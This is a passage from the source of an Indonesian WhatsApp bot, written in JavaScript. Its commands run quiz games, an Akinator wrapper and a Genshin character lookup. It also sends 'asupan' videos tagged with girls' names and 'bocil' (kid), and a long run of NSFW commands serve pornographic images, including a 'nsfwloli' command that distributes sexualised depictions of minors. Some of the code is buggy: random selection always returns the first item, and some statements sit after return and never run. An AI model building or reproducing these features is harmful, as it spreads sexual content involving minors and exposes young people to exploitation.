let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaktebakan.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
tebaktebakan[m.chat] = [
await HuBotZ.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik`, m), result, 250,
setTimeout(() => {
if (tebaktebakan[m.chat]) {
return reply(`*WaktuHabis!*\n*Jawaban:* ${result.jawaban}`)
delete tebaktebakan[m.chat]
}
}, 120000)
]
}
db.data.users[m.sender].glimit -= 1
break
case 'hinttebak': {
if (!(m.chat in tebaktebakan)) return
let json = tebaktebakan[m.chat][1]
reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```', `Ketik *${prefix}nyerahtebak* Untuk Menyerah`)
addCountCmd('#hinttebak', m.sender, _cmd);
}
break
case 'nyerahtebak': {
if (!(m.chat in tebaktebakan)) return
clearTimeout(tebaktebakan[m.chat][3])
delete tebaktebakan[m.chat]
return HuBotZ.sendMessage(m.chat, {text: `_*Lemahh Gitu Doang Nyerah*_ 😂q`}, {quoted: fkontak})
addCountCmd('#nyerahtebak', m.sender, _cmd);
}
break
case 'susunkata': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.isGroup) return reply(mess.OnlyGrup)
if (!isPremium && db.data.users[m.sender].glimit < 1) return m.reply(mess.EndLimitGame)
if (susunkata[m.chat]) return HuBotZ.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: susunkata[m.chat][0]
})
addCountCmd('#susunkata', m.sender, _cmd);
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/susunkata.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
susunkata[m.chat] = [
await HuBotZ.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\nSoal : ${result.soal}\nTipe : ${result.tipe}\nWaktu : ${(120000 / 1000).toFixed(2)} detik`, m), result, 250,
setTimeout(() => {
if (susunkata[m.chat]) {
return reply(`*WaktuHabis!*\n*Jawaban:* ${result.jawaban}`)
delete susunkata[m.chat]
}
}, 120000)
]
}
db.data.users[m.sender].glimit -= 1
break
case 'hintsusun': {
if (!(m.chat in susunkata)) return
let json = susunkata[m.chat][1]
reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```', `Ketik *${prefix}nyerahsusun* Untuk Nyerah`)
addCountCmd('#hintsusun', m.sender, _cmd);
}
break
case 'nyerahsusun': {
if (!(m.chat in susunkata)) return
clearTimeout(susunkata[m.chat][3])
delete susunkata[m.chat]
return HuBotZ.sendMessage(m.chat, {text: `_*Lemahh Gitu Doang Nyerah*_ 😂`}, {quoted: fkontak})
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
case 'caklontong': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.isGroup) return reply(mess.OnlyGrup)
if (!isPremium && db.data.users[m.sender].glimit < 1) return m.reply(mess.EndLimitGame)
if (caklontong[m.chat]) return HuBotZ.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: caklontong[m.chat][0]
})
addCountCmd(`#${command}`, m.sender, _cmd);
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
caklontong[m.chat] = [
await HuBotZ.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\nSoal : ${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik\nJika Anda Merasa Ga Mampu Silahkan Ketik .ytelo`, m), result, 250,
setTimeout(() => {
if (caklontong[m.chat]) {
return reply(`*WaktuHabis!*\n*Jawaban:* ${result.jawaban}`)
delete caklontong[m.chat]
}
}, 120000)
]
}
db.data.users[m.sender].glimit -= 1
break
case 'hintlontong': {
if (!(m.chat in caklontong)) return
let json = caklontong[m.chat][1]
reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```', `Ketik *${prefix}nyerahlontong* Untuk Nyerah`)
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
case 'nyerahlontong': {
if (!(m.chat in caklontong)) return
clearTimeout(caklontong[m.chat][3])
delete caklontong[m.chat]
return HuBotZ.sendMessage(m.chat, {text: `_*Lemahh Gitu Doang Nyerah*_ 😂`}, {quoted: fkontak})
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
case 'tekateki': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.isGroup) return reply(mess.OnlyGrup)
if (!isPremium && db.data.users[m.sender].glimit < 1) return m.reply(mess.EndLimitGame)
if (tekateki[m.chat]) return HuBotZ.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tekateki[m.chat][0]
})
addCountCmd(`#${command}`, m.sender, _cmd);
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tekateki.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
tekateki[m.chat] = [
await HuBotZ.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik`, m), result, 250,
setTimeout(() => {
if (tekateki[m.chat]) {
return reply(`*WaktuHabis!*\n*Jawaban:* ${result.jawaban}`)
delete tekateki[m.chat]
}
}, 120000)
]
}
db.data.users[m.sender].glimit -= 1
break
case 'hintteki': {
if (!(m.chat in tekateki)) return
let json = tekateki[m.chat][1]
reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```', `Ketik *${prefix}nyerahteki* Untuk Nyerah`)
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
case 'nyerahteki': {
if (!(m.chat in tekateki)) return
clearTimeout(tekateki[m.chat][3])
delete tekateki[m.chat]
return HuBotZ.sendMessage(m.chat, {text: `_*Lemahh Gitu Doang Nyerah*_ 😂`}, {quoted: fkontak})
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
case 'akinator':
                reply(`Akinator adalah sebuah permainan dan aplikasi perangkat bergerak yang berupaya menebak secara rinci dan pasti isi pikiran Pengguna permainan ini melalui serentetan pertanyaan.\n\n*~> ${prefix}akinatorstart *: Untuk memulai\n*~> ${prefix}akinatorstop :* Untuk berhenti`)
                addCountCmd(`#${command}`, m.sender, _cmd);
                break
            case 'akinatorstart':
                if (m.isGroup) return reply(mess.OnlyPM)
                if (akinator.hasOwnProperty(m.sender.split('@')[0])) return reply("Selesein yg sebelumnya dulu lah")
                get_result = await fetchJson(`https://api.lolhuman.xyz/api/akinator/start?apikey=${global.lolhuman}`)
                let {
                    server, frontaddr, session, signature, question, step
                } = get_result.result
                const kon = {}
                kon["server"] = server
                kon["frontaddr"] = frontaddr
                kon["session"] = session
                kon["signature"] = signature
                kon["question"] = question
                kon["step"] = step
                imi_txt = `${question}\n\n`
                imi_txt += "0 - Ya\n"
                imi_txt += "1 - Tidak\n"
                imi_txt += "2 - Saya Tidak Tau\n"
                imi_txt += "3 - Mungkin\n"
                imi_txt += "4 - Mungkin Tidak"
                HuBotZ.sendText(m.chat, imi_txt, m).then(() => {
                    akinator[m.sender.split('@')[0]] = kon
                    fs.writeFileSync("./game/akinator.json", JSON.stringify(akinator))
                    addCountCmd(`#${command}`, m.sender, _cmd);
                })
                break
            case 'akinatorstop':
                if (!akinator.hasOwnProperty(m.sender.split('@')[0])) return reply("Anda tidak memiliki akinator sebelumnya")
                delete akinator[m.sender.split('@')[0]]
                fs.writeFileSync("./game/akinator.json", JSON.stringify(akinator))
                reply("Success mengcancel akinator sebelumnya")
                addCountCmd(`#${command}`, m.sender, _cmd);
                break
//asupan
case 'chika': 
case 'rikagusriani': 
case 'bocil': 
case 'geayubi': 
case 'santuy': 
case 'ukhty': 
case 'asupan': 
case 'delvira': 
case 'ayu': 
case 'bunga': 
case 'aura':
case 'nisa': 
case 'ziva': 
case 'yana': 
case 'viona': 
case 'syania': 
case 'riri': 
case 'syifa': 
case 'mama_gina': 
case 'alcakenya': 
case 'mangayutri': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isCreator && !isPremium)return reply(mess.OnlyPrem)
reply(mess.wait)
HuBotZ.sendMessage(m.chat, {video: {url: `https://api.zeeoneofc.my.id/api/asupan/${command}?apikey=${global.ZeeApi}`, mimetype:'video/mp4'}, caption: 'Nih asupan guys 😋'},{quoted: m})
.catch((err) => {
reply(util.format(err))
})
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
//genshin
case 'gichar':
case 'gicharacter':
case 'gikarakter': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
if (!text) return reply(`Karakter Genshin Apa Yang Kamu Cari?`)
await HuBotZ.sendMessage(m.chat, {
    react: {
        text: '⌛',
        key: m.key,
    }})
try {
const genshindb = require("genshin-db")
a = text.toLowerCase();
const gichar = await genshindb.characters(text)
let txt = ""
txt += `🎀 *Name:* ${gichar.name}\n`
txt += `🎖️ *Title:* ${gichar.title}\n`
txt += `💠 *Vision:* ${gichar.vision}\n`
txt += `🏹 *Weapon:* ${gichar.weapon}\n`
txt += `🎉 *Birthday:* ${gichar.birthday}\n`
txt += `🌏 *Nation:* ${gichar.nation}\n`
txt += `🪷 *Affiliation:* ${gichar.affiliation}\n`
txt += `🌟 *Rarity:* ${gichar.rarity}\n`
txt += `❄️ *Constellation:* ${gichar.constellation}\n`
txt += `📖 *Description:* ${gichar.description}\n`
txt += `🌐 *Url:* https://genshin-impact.fandom.com/wiki/${a}\n`
urll = `https://genshin.jmp.blue/characters/${a}/portrait`
await HuBotZ.sendMessage(m.chat, { image: { url: urll }, caption: txt }, { quoted:fkontak })
await HuBotZ.sendMessage(m.chat, {
    react: {
        text: '✔️',
        key: m.key,
    }})
} catch (err) {
console.log(err)
await HuBotZ.sendMessage(m.chat, {
    react: {
        text: '❌',
        key: m.key,
    }})
db.data.users[m.sender].limit -= 1
addCountCmd(`#${command}`, m.sender, _cmd);
}
}
break
//nsfw
	case 'hentaivid2': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.isGroup) return reply(mess.OnlyGroup)
if (!isPremium) return reply(mess.OnlyPrem)
if (!isNsfw) return replygcHuBotZ('_Fitur NSFW Belum Diaktifkan!_')
reply(mess.wait)
sbe = await hentaivid()
cejd = sbe[Math.floor(Math.random(), sbe.length)]
HuBotZ.sendMessage(m.chat, { video: { url: cejd.video_1 }, 
caption: `
⭔ Title : ${cejd.title}
⭔ Category : ${cejd.category}
⭔ Mimetype : ${cejd.type}
⭔ Views : ${cejd.views_count}
⭔ Shares : ${cejd.share_count}
⭔ Source : ${cejd.link}
⭔ Media Url : ${cejd.video_1}`
 }, { quoted: m })
 addCountCmd(`#${command}`, m.sender, _cmd);
}
break
	case 'hentaivid': 
	case 'hentaivideo': {
    if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
	if (!m.isGroup) return reply(mess.OnlyGroup)
	if (!isPremium) return reply(mess.OnlyPrem)
    if (!isNsfw) return replygcHuBotZ('_Fitur NSFW Belum Diaktifkan!_')
                m.reply(mess.wait)
                const { hentai } = require('./lib/scraper')
                anu = await hentai()
                result912 = anu[Math.floor(Math.random(), anu.length)]
                HuBotZ.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `${themeemoji} Title : ${result912.title}\n${themeemoji} Category : ${result912.category}\n${themeemoji} Mimetype : ${result912.type}\n${themeemoji} Views : ${result912.views_count}\n${themeemoji} Shares : ${result912.share_count}\n${themeemoji} Source : ${result912.link}\n${themeemoji} Media Url : ${result912.video_1}` }, { quoted: m })
            addCountCmd(`#${command}`, m.sender, _cmd);
            }
            break
case 'trap' :
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.isGroup) return reply(mess.OnlyGroup)
if (!isNsfw) return replygcHuBotZ('_Fitur NSFW Belum Diaktifkan!_')
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`)       
HuBotZ.sendMessage(m.chat, { image: waifudd.data.url, caption: '_Done Ngab_' }, { quoted: m })
addCountCmd(`#${command}`, m.sender, _cmd);
break
case 'hentai-neko' :
case 'hneko' :
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.isGroup) return reply(mess.OnlyGroup)
if (!isNsfw) return replygcHuBotZ('_Fitur NSFW Belum Diaktifkan!_')
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
HuBotZ.sendMessage(m.chat, { image: waifudd.data.url, caption: '_Done Ngab_' }, { quoted: m })
addCountCmd(`#${command}`, m.sender, _cmd);
break
case 'hentai-waifu' :
case 'nwaifu' :
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.isGroup) return reply(mess.OnlyGroup)
if (!isNsfw) return replygcHuBotZ('_Fitur NSFW Belum Diaktifkan!_')
reply(mess.wait)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
HuBotZ.sendMessage(m.chat, { image: waifudd.data.url, caption: '_Done Ngab_' }, { quoted: m })
addCountCmd(`#${command}`, m.sender, _cmd);
break
case 'gasm':
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.isGroup) return reply(mess.OnlyGroup)
	if (!isNsfw) return replygcHuBotZ('_Fitur NSFW Belum Diaktifkan!_')
reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
HuBotZ.sendMessage(m.chat, { image: waifudd.data.url, caption: '_Done Ngab_' }, { quoted: m })
addCountCmd(`#${command}`, m.sender, _cmd);
break  
case 'milf':
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.isGroup) return reply(mess.OnlyGroup)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./BotZMedia/nsfw/milf.json'))
var result = pickRandom(ahegaonsfw)
await HuBotZ.sendMessage(m.chat, { image: result.url, caption: `_Done Ngab_` }, { quoted:m })
addCountCmd(`#${command}`, m.sender, _cmd);
break 
case 'animespank':
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.isGroup) return m.reply(mess.OnlyGroup)
if (!isNsfw) return replygcHuBotZ('_Fitur NSFW Belum Diaktifkan!_')
m.reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/spank`)    
 await HuBotZ.sendMessage(m.chat, { image: waifudd.data.url, caption: `Here you go!` }, { quoted:m })
            .catch(err => {
                    return('Error!')
                })
addCountCmd(`#${command}`, m.sender, _cmd);
break
case 'ahegao':
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.isGroup) return reply(mess.OnlyGroup)
	if (!isNsfw) return replygcHuBotZ('_Fitur NSFW Belum Diaktifkan!_')
m.reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./BotZMedia/nsfw/ahegao.json'))
var result = pickRandom(ahegaonsfw)
await HuBotZ.sendFile(m.chat, Buffer.from(result.url, 'base64'), null, `_Done Ngab_`, m)
addCountCmd(`#${command}`, m.sender, _cmd);
break
case 'ass':
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.isGroup) return reply(mess.OnlyGroup)
	if (!isNsfw) return replygcHuBotZ('_Fitur NSFW Belum Diaktifkan!_')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./BotZMedia/nsfw/ass.json'))
var result = pickRandom(ahegaonsfw)
await HuBotZ.sendFile(m.chat, result.url, null, `_Done Ngab_`, m)
addCountCmd(`#${command}`, m.sender, _cmd);
break
case 'bdsm':
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.isGroup) return reply(mess.OnlyGroup)
	if (!isNsfw) return replygcHuBotZ('_Fitur NSFW Belum Diaktifkan!_')
m.reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./BotZMedia/nsfw/bdsm.json'))
var result = pickRandom(ahegaonsfw)
await HuBotZ.sendFile(m.chat, result.url, null, `_Done Ngab_`, m)
addCountCmd(`#${command}`, m.sender, _cmd);
break
case 'blowjob':
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.isGroup) return reply(mess.OnlyGroup)
	if (!isNsfw) return replygcHuBotZ('_Fitur NSFW Belum Diaktifkan!_')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./BotZMedia/nsfw/blowjob.json'))
var result = pickRandom(ahegaonsfw)
await HuBotZ.sendFile(m.chat, result.url, null, `_Done Ngab_`, m)
addCountCmd(`#${command}`, m.sender, _cmd);
break
case 'cuckold':
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.isGroup) return reply(mess.OnlyGroup)
	if (!isNsfw) return replygcHuBotZ('_Fitur NSFW Belum Diaktifkan!_')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./BotZMedia/nsfw/cuckold.json'))
var result = pickRandom(ahegaonsfw)
await HuBotZ.sendFile(m.chat, result.url, null, `_Done Ngab_`, m)
addCountCmd(`#${command}`, m.sender, _cmd);
break
case 'cum':
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.isGroup) return reply(mess.OnlyGroup)
	if (!isNsfw) return replygcHuBotZ('_Fitur NSFW Belum Diaktifkan!_')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./BotZMedia/nsfw/cum.json'))
var result = pickRandom(ahegaonsfw)
await HuBotZ.sendFile(m.chat, result.url, null, `_Done Ngab_`, m)
addCountCmd(`#${command}`, m.sender, _cmd);
break
case 'eba':
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.isGroup) return reply(mess.OnlyGroup)
	if (!isNsfw) return replygcHuBotZ('_Fitur NSFW Belum Diaktifkan!_')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./BotZMedia/nsfw/eba.json'))
var result = pickRandom(ahegaonsfw)
await HuBotZ.sendFile(m.chat, result.url, null, `_Done Ngab_`, m)
addCountCmd(`#${command}`, m.sender, _cmd);
break
case 'ero':
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.isGroup) return reply(mess.OnlyGroup)
	if (!isNsfw) return replygcHuBotZ('_Fitur NSFW Belum Diaktifkan!_')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./BotZMedia/nsfw/ero.json'))
var result = pickRandom(ahegaonsfw)
await HuBotZ.sendFile(m.chat, result.url, null, `_Done Ngab_`, m)
addCountCmd(`#${command}`, m.sender, _cmd);
break
case 'femdom':
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.isGroup) return reply(mess.OnlyGroup)
	if (!isNsfw) return replygcHuBotZ('_Fitur NSFW Belum Diaktifkan!_')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./BotZMedia/nsfw/femdom.json'))
var result = pickRandom(ahegaonsfw)
await HuBotZ.sendFile(m.chat, result.url, null, `_Done Ngab_`, m)
addCountCmd(`#${command}`, m.sender, _cmd);
break
case 'foot':
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.isGroup) return reply(mess.OnlyGroup)
	if (!isNsfw) return replygcHuBotZ('_Fitur NSFW Belum Diaktifkan!_')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./BotZMedia/nsfw/foot.json'))
var result = pickRandom(ahegaonsfw)
await HuBotZ.sendFile(m.chat, result.url, null, `_Done Ngab_`, m)
addCountCmd(`#${command}`, m.sender, _cmd);
break
case 'gangbang':
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.isGroup) return reply(mess.OnlyGroup)
	if (!isNsfw) return replygcHuBotZ('_Fitur NSFW Belum Diaktifkan!_')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./BotZMedia/nsfw/gangbang.json'))
var result = pickRandom(ahegaonsfw)
await HuBotZ.sendFile(m.chat, result.url, null, `_Done Ngab_`, m)
addCountCmd(`#${command}`, m.sender, _cmd);
break
case 'glasses':
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.isGroup) return reply(mess.OnlyGroup)
	if (!isNsfw) return replygcHuBotZ('_Fitur NSFW Belum Diaktifkan!_')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./BotZMedia/nsfw/glasses.json'))
var result = pickRandom(ahegaonsfw)
await HuBotZ.sendFile(m.chat, result.url, null, `_Done Ngab_`, m)
addCountCmd(`#${command}`, m.sender, _cmd);
break
case 'hentai':
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.isGroup) return reply(mess.OnlyGroup)
	if (!isNsfw) return reply('_Fitur NSFW Belum Diaktifkan!_')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./BotZMedia/nsfw/hentai.json'))
var result = pickRandom(ahegaonsfw)
await HuBotZ.sendFile(m.chat, result.url, null, `_Done Ngab_`, m)
addCountCmd(`#${command}`, m.sender, _cmd);
break
case 'jahy':
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.isGroup) return reply(mess.OnlyGroup)
	if (!isNsfw) return replygcHuBotZ('_Fitur NSFW Belum Diaktifkan!_')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./BotZMedia/nsfw/jahy.json'))
var result = pickRandom(ahegaonsfw)
await HuBotZ.sendFile(m.chat, result.url, null, `_Done Ngab_`, m)
addCountCmd(`#${command}`, m.sender, _cmd);
break
case 'manga':
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.isGroup) return reply(mess.OnlyGroup)
	if (!isNsfw) return replygcHuBotZ('_Fitur NSFW Belum Diaktifkan!_')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./BotZMedia/nsfw/manga.json'))
var result = pickRandom(ahegaonsfw)
await HuBotZ.sendFile(m.chat, result.url, null, `_Done Ngab_`, m)
addCountCmd(`#${command}`, m.sender, _cmd);
break
case 'masturbation':
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.isGroup) return reply(mess.OnlyGroup)
	if (!isNsfw) return replygcHuBotZ('_Fitur NSFW Belum Diaktifkan!_')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./BotZMedia/nsfw/masturbation.json'))
var result = pickRandom(ahegaonsfw)
await HuBotZ.sendFile(m.chat, result.url, null, `_Done Ngab_`, m)
addCountCmd(`#${command}`, m.sender, _cmd);
break
case 'neko-hentai':
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.isGroup) return reply(mess.OnlyGroup)
	if (!isNsfw) return replygcHuBotZ('_Fitur NSFW Belum Diaktifkan!_')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./BotZMedia/nsfw/neko.json'))
var result = pickRandom(ahegaonsfw)
await HuBotZ.sendFile(m.chat, result.url, null, `_Done Ngab_`, m)
addCountCmd(`#${command}`, m.sender, _cmd);
break
case 'neko-hentai2':
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.isGroup) return reply(mess.OnlyGroup)
	if (!isNsfw) return replygcHuBotZ('_Fitur NSFW Belum Diaktifkan!_')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./BotZMedia/nsfw/neko2.json'))
var result = pickRandom(ahegaonsfw)
await HuBotZ.sendFile(m.chat, result.url, null, `_Done Ngab_`, m)
addCountCmd(`#${command}`, m.sender, _cmd);
break
case 'nsfwloli':
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.isGroup) return reply(mess.OnlyGroup)
	if (!isNsfw) return replygcHuBotZ('_Fitur NSFW Belum Diaktifkan!_')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./BotZMedia/nsfw/nsfwloli.json'))
var result = pickRandom(ahegaonsfw)
await HuBotZ.sendFile(m.chat, result.url, null, `_Done Ngab_`, m)
addCountCmd(`#${command}`, m.sender, _cmd);
break
case 'orgy':
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.isGroup) return reply(mess.OnlyGroup)
	if (!isNsfw) return replygcHuBotZ('_Fitur NSFW Belum Diaktifkan!_')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./BotZMedia/nsfw/orgy.json'))
var result = pickRandom(ahegaonsfw)
await HuBotZ.sendFile(m.chat, result.url, null, `_Done Ngab_`, m)
addCountCmd(`#${command}`, m.sender, _cmd);
break
case 'panties':
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.isGroup) return reply(mess.OnlyGroup)
	if (!isNsfw) return replygcHuBotZ('_Fitur NSFW Belum Diaktifkan!_')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./BotZMedia/nsfw/panties.json'))
var result = pickRandom(ahegaonsfw)
await HuBotZ.sendFile(m.chat, result.url, null, `_Done Ngab_`, m)
addCountCmd(`#${command}`, m.sender, _cmd);
break
case 'pussy':
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.isGroup) return reply(mess.OnlyGroup)
	if (!isNsfw) return replygcHuBotZ('_Fitur NSFW Belum Diaktifkan!_')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./BotZMedia/nsfw/pussy.json'))
var result = pickRandom(ahegaonsfw)
await HuBotZ.sendFile(m.chat, result.url, null, `_Done Ngab_`, m)
addCountCmd(`#${command}`, m.sender, _cmd);
break
case 'tentacles':
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.isGroup) return reply(mess.OnlyGroup)
	if (!isNsfw) return replygcHuBotZ('_Fitur NSFW Belum Diaktifkan!_')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./BotZMedia/nsfw/tentacles.json'))
var result = pickRandom(ahegaonsfw)
await HuBotZ.sendFile(m.chat, result.url, null, `_Done Ngab_`, m)
addCountCmd(`#${command}`, m.sender, _cmd);
break
case 'thights':
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.isGroup) return reply(mess.OnlyGroup)
	if (!isNsfw) return replygcHuBotZ('_Fitur NSFW Belum Diaktifkan!_')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./BotZMedia/nsfw/thights.json'))
var result = pickRandom(ahegaonsfw)
await HuBotZ.sendFile(m.chat, result.url, null, `_Done Ngab_`, m)
addCountCmd(`#${command}`, m.sender, _cmd);
break
case 'yuri':
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.isGroup) return reply(mess.OnlyGroup)
	if (!isNsfw) return replygcHuBotZ('_Fitur NSFW Belum Diaktifkan!_')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./BotZMedia/nsfw/yuri.json'))
var result = pickRandom(ahegaonsfw)
await HuBotZ.sendFile(m.chat, result.url, null, `_Done Ngab_`, m)
addCountCmd(`#${command}`, m.sender, _cmd);
break
case 'zettai':
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.isGroup) return reply(mess.OnlyGroup)
	if (!isNsfw) return replygcHuBotZ('_Fitur NSFW Belum Diaktifkan!_')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./BotZMedia/nsfw/zettai.json'))
var result = pickRandom(ahegaonsfw)
await HuBotZ.sendFile(m.chat, result.url, null, `_Done Ngab_`, m)
addCountCmd(`#${command}`, m.sender, _cmd);
break
case 'gifblowjob':
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.isGroup) return reply(mess.OnlyGroup)
if (!isNsfw) return replygcHuBotZ('_Fitur NSFW Belum Diaktifkan!_')
reply(mess.wait)
  let assss = await axios.get ("https://api.waifu.pics/nsfw/blowjob")
    var bobuff = await fetchBuffer(assss.data.url)
    var bogif = await buffergif(bobuff)
    await HuBotZ.sendMessage(m.chat,{video:bogif, gifPlayback:true },{quoted:m}).catch(err => {
    })
addCountCmd(`#${command}`, m.sender, _cmd);
    break
case 'gifhentai':
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.isGroup) return reply(mess.OnlyGroup)
if (!isNsfw) return replygcHuBotZ('_Fitur NSFW Belum Diaktifkan!_')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./BotZMedia/nsfw/gifs.json'))
var HuBotZresultx = pickRandom(ahegaonsfw)
    await HuBotZ.sendMessage(m.chat,{video:HuBotZresultx, gifPlayback:true },{quoted:m}).catch(err => {
    })
addCountCmd(`#${command}`, m.sender, _cmd);
    break
    case 'gifs': case 'foot': {
